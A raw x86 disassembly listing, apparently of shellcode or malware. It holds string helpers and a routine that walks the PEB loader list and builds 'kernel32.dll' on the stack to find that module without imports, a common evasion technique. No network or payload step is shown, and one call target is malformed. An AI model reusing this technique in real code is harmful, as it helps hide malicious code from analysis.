00000CD4 7D12                            JGE 00000CE8
00000CD6 8B4508                          MOV EAX,DWORD PTR [EBP+08]
00000CD9 0345FC                          ADD EAX,DWORD PTR [EBP-04]
00000CDC 8B4D0C                          MOV ECX,DWORD PTR [EBP+0C]
00000CDF 034DFC                          ADD ECX,DWORD PTR [EBP-04]
00000CE2 8A09                            MOV CL,BYTE PTR [ECX]
00000CE4 8808                            MOV BYTE PTR [EAX],CL
00000CE6 EBDF                            JMP 00000CC7
00000CE8 C9                              LEAVE
00000CE9 C3                              RET
00000CEA 55                              PUSH EBP
00000CEB 8BEC                            MOV EBP,ESP
00000CED 51                              PUSH ECX
00000CEE 0FBE4508                        MOVSX EAX,BYTE PTR [EBP+08]
00000CF2 83F841                          CMP EAX,00000041
00000CF5 7C12                            JL 00000D09
00000CF7 0FBE4508                        MOVSX EAX,BYTE PTR [EBP+08]
00000CFB 83F85A                          CMP EAX,0000005A
00000CFE 7F09                            JG 00000D09
00000D00 C745FC01000000                  MOV DWORD PTR [EBP-04],00000001
00000D07 EB04                            JMP 00000D0D
00000D09 8365FC00                        AND DWORD PTR [EBP-04],00000000
00000D0D 8B45FC                          MOV EAX,DWORD PTR [EBP-04]
00000D10 C9                              LEAVE
00000D11 C3                              RET
00000D12 55                              PUSH EBP
00000D13 8BEC                            MOV EBP,ESP
00000D15 51                              PUSH ECX
00000D16 FF7508                          PUSH DWORD PTR [EBP+08]
00000D19 E8CCFFFFFF                      CALL 00000CEA
00000D1E 59                              POP ECX
00000D1F 85C0                            TEST EAX,EAX
00000D21 740C                            JE 00000D2F
00000D23 0FBE4508                        MOVSX EAX,BYTE PTR [EBP+08]
00000D27 83C020                          ADD EAX,00000020
00000D2A 8945FC                          MOV DWORD PTR [EBP-04],EAX
00000D2D EB07                            JMP 00000D36
00000D2F 0FBE4508                        MOVSX EAX,BYTE PTR [EBP+08]
00000D33 8945FC                          MOV DWORD PTR [EBP-04],EAX
00000D36 8A45FC                          MOV AL,BYTE PTR [EBP-04]
00000D39 C9                              LEAVE
00000D3A C3                              RET
00000D3B 55                              PUSH EBP
00000D3C 8BEC                            MOV EBP,ESP
00000D3E 51                              PUSH ECX
00000D3F 8365FC00                        AND DWORD PTR [EBP-04],00000000
00000D43 8B45FC                          MOV EAX,DWORD PTR [EBP-04]
00000D46 8B4D08                          MOV ECX,DWORD PTR [EBP+08]
00000D49 0FB70441                        MOVZX EAX,WORD PTR [ECX+EAX*2]
00000D4D 85C0                            TEST EAX,EAX
00000D4F 7409                            JE 00000D5A
00000D51 8B45FC                          MOV EAX,DWORD PTR [EBP-04]
00000D54 40                              INC EAX
00000D55 8945FC                          MOV DWORD PTR [EBP-04],EAX
00000D58 EBE9                            JMP 00000D43
00000D5A 8B45FC                          MOV EAX,DWORD PTR [EBP-04]
00000D5D C9                              LEAVE
00000D5E C3                              RET
00000D5F 55                              PUSH EBP
00000D60 8BEC                            MOV EBP,ESP
00000D62 83EC10                          SUB ESP,00000010
00000D65 33C0                            XOR EAX,EAX
00000D67 40                              INC EAX
00000D68 6BC000                          IMUL EAX,EAX,00000000
00000D6B 8B4D0C                          MOV ECX,DWORD PTR [EBP+0C]
00000D6E 8A0401                          MOV AL,BYTE PTR [ECX+EAX]
00000D71 8845F8                          MOV BYTE PTR [EBP-08],AL
00000D74 FF75F8                          PUSH DWORD PTR [EBP-08]
00000D77 E896FFFFFF                      CALL 00000D12
00000D7C 59                              POP ECX
00000D7D 8845FE                          MOV BYTE PTR [EBP-02],AL
00000D80 8B450C                          MOV EAX,DWORD PTR [EBP+0C]
00000D83 40                              INC EAX
00000D84 40                              INC EAX
00000D85 89450C                          MOV DWORD PTR [EBP+0C],EAX
00000D88 0FBE45FE                        MOVSX EAX,BYTE PTR [EBP-02]
00000D8C 85C0                            TEST EAX,EAX
00000D8E 7505                            JNE 00000D95
00000D90 8B4508                          MOV EAX,DWORD PTR [EBP+08]
00000D93 EB61                            JMP 00000DF6
00000D95 FF750C                          PUSH DWORD PTR [EBP+0C]
00000D98 E89EFFFFFF                      CALL 00000D3B
00000D9D 59                              POP ECX
00000D9E 8945F0                          MOV DWORD PTR [EBP-10],EAX
00000DA1 33C0                            XOR EAX,EAX
00000DA3 40                              INC EAX
00000DA4 6BC000                          IMUL EAX,EAX,00000000
00000DA7 8B4D08                          MOV ECX,DWORD PTR [EBP+08]
00000DAA 8A0401                          MOV AL,BYTE PTR [ECX+EAX]
00000DAD 8845F4                          MOV BYTE PTR [EBP-0C],AL
00000DB0 FF75F4                          PUSH DWORD PTR [EBP-0C]
00000DB3 E85AFFFFFF                      CALL 00000D12
00000DB8 59                              POP ECX
00000DB9 8845FF                          MOV BYTE PTR [EBP-01],AL
00000DBC 8B4508                          MOV EAX,DWORD PTR [EBP+08]
00000DBF 40                              INC EAX
00000DC0 40                              INC EAX
00000DC1 894508                          MOV DWORD PTR [EBP+08],EAX
00000DC4 0FBE45FF                        MOVSX EAX,BYTE PTR [EBP-01]
00000DC8 85C0                            TEST EAX,EAX
00000DCA 7504                            JNE 00000DD0
00000DCC 33C0                            XOR EAX,EAX
00000DCE EB26                            JMP 00000DF6
00000DD0 0FBE45FF                        MOVSX EAX,BYTE PTR [EBP-01]
00000DD4 0FBE4DFE                        MOVSX ECX,BYTE PTR [EBP-02]
00000DD8 3BC1                            CMP EAX,ECX
00000DDA 75C5                            JNE 00000DA1
00000DDC FF75F0                          PUSH DWORD PTR [EBP-10]
00000DDF FF750C                          PUSH DWORD PTR [EBP+0C]
00000DE2 FF7508                          PUSH DWORD PTR [EBP+08]
00000DE5 E868000000                      CALL -FFFFF1AE
00000DEA 83C40C                          ADD ESP,0000000C
00000DED 85C0                            TEST EAX,EAX
00000DEF 75B0                            JNE 00000DA1
00000DF1 8B4508                          MOV EAX,DWORD PTR [EBP+08]
00000DF4 48                              DEC EAX
00000DF5 48                              DEC EAX
00000DF6 C9                              LEAVE
00000DF7 C3                              RET
00000DF8 55                              PUSH EBP
00000DF9 8BEC                            MOV EBP,ESP
00000DFB 83EC0C                          SUB ESP,0000000C
00000DFE 56                              PUSH ESI
00000DFF 8B4508                          MOV EAX,DWORD PTR [EBP+08]
00000E02 8A00                            MOV AL,BYTE PTR [EAX]
00000E04 8845FC                          MOV BYTE PTR [EBP-04],AL
00000E07 8B4508                          MOV EAX,DWORD PTR [EBP+08]
00000E0A 40                              INC EAX
00000E0B 894508                          MOV DWORD PTR [EBP+08],EAX
00000E0E 8B450C                          MOV EAX,DWORD PTR [EBP+0C]
00000E11 8A00                            MOV AL,BYTE PTR [EAX]
00000E13 8845F8                          MOV BYTE PTR [EBP-08],AL
00000E16 8B450C                          MOV EAX,DWORD PTR [EBP+0C]
00000E19 40                              INC EAX
00000E1A 89450C                          MOV DWORD PTR [EBP+0C],EAX
00000E1D FF75FC                          PUSH DWORD PTR [EBP-04]
00000E20 E8EDFEFFFF                      CALL 00000D12
00000E25 59                              POP ECX
00000E26 0FBEF0                          MOVSX ESI,AL
00000E29 FF75F8                          PUSH DWORD PTR [EBP-08]
00000E2C E8E1FEFFFF                      CALL 00000D12
00000E31 59                              POP ECX
00000E32 0FBEC0                          MOVSX EAX,AL
00000E35 2BF0                            SUB ESI,EAX
00000E37 8975F4                          MOV DWORD PTR [EBP-0C],ESI
00000E3A 7510                            JNE 00000E4C
00000E3C 0FBE45FC                        MOVSX EAX,BYTE PTR [EBP-04]
00000E40 85C0                            TEST EAX,EAX
00000E42 7408                            JE 00000E4C
00000E44 0FBE45F8                        MOVSX EAX,BYTE PTR [EBP-08]
00000E48 85C0                            TEST EAX,EAX
00000E4A 75B3                            JNE 00000DFF
00000E4C 8B45F4                          MOV EAX,DWORD PTR [EBP-0C]
00000E4F 5E                              POP ESI
00000E50 C9                              LEAVE
00000E51 C3                              RET
00000E52 55                              PUSH EBP
00000E53 8BEC                            MOV EBP,ESP
00000E55 83EC0C                          SUB ESP,0000000C
00000E58 56                              PUSH ESI
00000E59 8B4510                          MOV EAX,DWORD PTR [EBP+10]
00000E5C 48                              DEC EAX
00000E5D 894510                          MOV DWORD PTR [EBP+10],EAX
00000E60 33C0                            XOR EAX,EAX
00000E62 40                              INC EAX
00000E63 6BC000                          IMUL EAX,EAX,00000000
00000E66 8B4D08                          MOV ECX,DWORD PTR [EBP+08]
00000E69 8A0401                          MOV AL,BYTE PTR [ECX+EAX]
00000E6C 8845FC                          MOV BYTE PTR [EBP-04],AL
00000E6F 8B4508                          MOV EAX,DWORD PTR [EBP+08]
00000E72 40                              INC EAX
00000E73 40                              INC EAX
00000E74 894508                          MOV DWORD PTR [EBP+08],EAX
00000E77 33C0                            XOR EAX,EAX
00000E79 40                              INC EAX
00000E7A 6BC000                          IMUL EAX,EAX,00000000
00000E7D 8B4D0C                          MOV ECX,DWORD PTR [EBP+0C]
00000E80 8A0401                          MOV AL,BYTE PTR [ECX+EAX]
00000E83 8845F8                          MOV BYTE PTR [EBP-08],AL
00000E86 8B450C                          MOV EAX,DWORD PTR [EBP+0C]
00000E89 40                              INC EAX
00000E8A 40                              INC EAX
00000E8B 89450C                          MOV DWORD PTR [EBP+0C],EAX
00000E8E FF75FC                          PUSH DWORD PTR [EBP-04]
00000E91 E87CFEFFFF                      CALL 00000D12
00000E96 59                              POP ECX
00000E97 0FBEF0                          MOVSX ESI,AL
00000E9A FF75F8                          PUSH DWORD PTR [EBP-08]
00000E9D E870FEFFFF                      CALL 00000D12
00000EA2 59                              POP ECX
00000EA3 0FBEC0                          MOVSX EAX,AL
00000EA6 2BF0                            SUB ESI,EAX
00000EA8 8975F4                          MOV DWORD PTR [EBP-0C],ESI
00000EAB 7516                            JNE 00000EC3
00000EAD 0FBE45FC                        MOVSX EAX,BYTE PTR [EBP-04]
00000EB1 85C0                            TEST EAX,EAX
00000EB3 740E                            JE 00000EC3
00000EB5 0FBE45F8                        MOVSX EAX,BYTE PTR [EBP-08]
00000EB9 85C0                            TEST EAX,EAX
00000EBB 7406                            JE 00000EC3
00000EBD 837D1000                        CMP DWORD PTR [EBP+10],00000000
00000EC1 7796                            JA 00000E59
00000EC3 8B45F4                          MOV EAX,DWORD PTR [EBP-0C]
00000EC6 5E                              POP ESI
00000EC7 C9                              LEAVE
00000EC8 C3                              RET
00000EC9 55                              PUSH EBP
00000ECA 8BEC                            MOV EBP,ESP
00000ECC 81EC3C020000                    SUB ESP,0000023C
00000ED2 834DECFF                        OR DWORD PTR [EBP-14],FFFFFFFF
00000ED6 64A130000000                    MOV EAX,DWORD PTR FS:[00000030]
00000EDC 8945CC                          MOV DWORD PTR [EBP-34],EAX
00000EDF 8B45CC                          MOV EAX,DWORD PTR [EBP-34]
00000EE2 8B400C                          MOV EAX,DWORD PTR [EAX+0C]
00000EE5 83C014                          ADD EAX,00000014
00000EE8 8945F4                          MOV DWORD PTR [EBP-0C],EAX
00000EEB 8B45F4                          MOV EAX,DWORD PTR [EBP-0C]
00000EEE 8B00                            MOV EAX,DWORD PTR [EAX]
00000EF0 8945F8                          MOV DWORD PTR [EBP-08],EAX
00000EF3 6A6B                            PUSH 0000006B                    ->  kernel32.dll
00000EF5 58                              POP EAX
00000EF6 668945D0                        MOV WORD PTR [EBP-30],AX
00000EFA 6A65                            PUSH 00000065
00000EFC 58                              POP EAX
00000EFD 668945D2                        MOV WORD PTR [EBP-2E],AX
00000F01 6A72                            PUSH 00000072
00000F03 58                              POP EAX
00000F04 668945D4                        MOV WORD PTR [EBP-2C],AX
00000F08 6A6E                            PUSH 0000006E
00000F0A 58                              POP EAX
00000F0B 668945D6                        MOV WORD PTR [EBP-2A],AX
00000F0F 6A65                            PUSH 00000065
00000F11 58                              POP EAX
00000F12 668945D8                        MOV WORD PTR [EBP-28],AX
00000F16 6A6C                            PUSH 0000006C
00000F18 58                              POP EAX
00000F19 668945DA                        MOV WORD PTR [EBP-26],AX
00000F1D 6A33                            PUSH 00000033
00000F1F 58                              POP EAX
00000F20 668945DC                        MOV WORD PTR [EBP-24],AX
00000F24 6A32                            PUSH 00000032
00000F26 58                              POP EAX
00000F27 668945DE                        MOV WORD PTR [EBP-22],AX
00000F2B 6A2E                            PUSH 0000002E
00000F2D 58                              POP EAX
00000F2E 668945E0                        MOV WORD PTR [EBP-20],AX
00000F32 6A64                            PUSH 00000064
00000F34 58                              POP EAX
00000F35 668945E2                        MOV WORD PTR [EBP-1E],AX
00000F39 6A6C                            PUSH 0000006C
00000F3B 58                              POP EAX
00000F3C 668945E4                        MOV WORD PTR [EBP-1C],AX
00000F40 6A6C                            PUSH 0000006C
00000F42 58                              POP EAX
00000F43 668945E6                        MOV WORD PTR [EBP-1A],AX
00000F47 33C0                            XOR EAX,EAX
00000F49 668945E8                        MOV WORD PTR [EBP-18],AX
00000F4D 8B45F8                          MOV EAX,DWORD PTR [EBP-08]
00000F50 3B45F4                          CMP EAX,DWORD PTR [EBP-0C]
00000F53 7470                            JE 00000FC5
00000F55 8B45F8                          MOV EAX,DWORD PTR [EBP-08]
00000F58 83E808                          SUB EAX,00000008
00000F5B 8945FC                          MOV DWORD PTR [EBP-04],EAX
00000F5E 8B45FC                          MOV EAX,DWORD PTR [EBP-04]
00000F61 0FB74024                        MOVZX EAX,WORD PTR [EAX+24]
00000F65 85C0                            TEST EAX,EAX
00000F67 7452                            JE 00000FBB
00000F69 8B45FC                          MOV EAX,DWORD PTR [EBP-04]
00000F6C 0FB74024                        MOVZX EAX,WORD PTR [EAX+24]
00000F70 8945F0                          MOV DWORD PTR [EBP-10],EAX
00000F73 FF75F0                          PUSH DWORD PTR [EBP-10]
00000F76 8B45FC                          MOV EAX,DWORD PTR [EBP-04]
00000F79 FF7028                          PUSH DWORD PTR [EAX+28]
00000F7C 8D85C4FDFFFF                    LEA EAX,[EBP-0000023C]
00000F82 50                              PUSH EAX
00000F83 E835FDFFFF                      CALL 00000CBD
00000F88 83C40C                          ADD ESP,0000000C
00000F8B 8B45F0                          MOV EAX,DWORD PTR [EBP-10]
00000F8E D1E8                            SHR EAX,1
00000F90 33C9                            XOR ECX,ECX
00000F92 66898C45C4FDFFFF                MOV WORD PTR [EBP+EAX*2-0000023C],CX
00000F9A 8D45D0                          LEA EAX,[EBP-30]
00000F9D 50                              PUSH EAX
00000F9E 8D85C4FDFFFF                    LEA EAX,[EBP-0000023C]
00000FA4 50                              PUSH EAX
00000FA5 E8B5FDFFFF                      CALL 00000D5F
00000FAA 59                              POP ECX
00000FAB 59                              POP ECX
00000FAC 85C0                            TEST EAX,EAX
00000FAE 740B                            JE 00000FBB
00000FB0 8B45FC                          MOV EAX,DWORD PTR [EBP-04]
00000FB3 8B4018                          MOV EAX,DWORD PTR [EAX+18]
00000FB6 8945EC                          MOV DWORD PTR [EBP-14],EAX
00000FB9 EB0A                            JMP 00000FC5
00000FBB 8B45F8                          MOV EAX,DWORD PTR [EBP-08]
00000FBE 8B00                            MOV EAX,DWORD PTR [EAX]
00000FC0 8945F8                          MOV DWORD PTR [EBP-08],EAX
00000FC3 EB88                            JMP 00000F4D
00000FC5 8B45EC                          MOV EAX,DWORD PTR [EBP-14]
00000FC8 C9                              LEAVE
00000FC9 C3                              RET
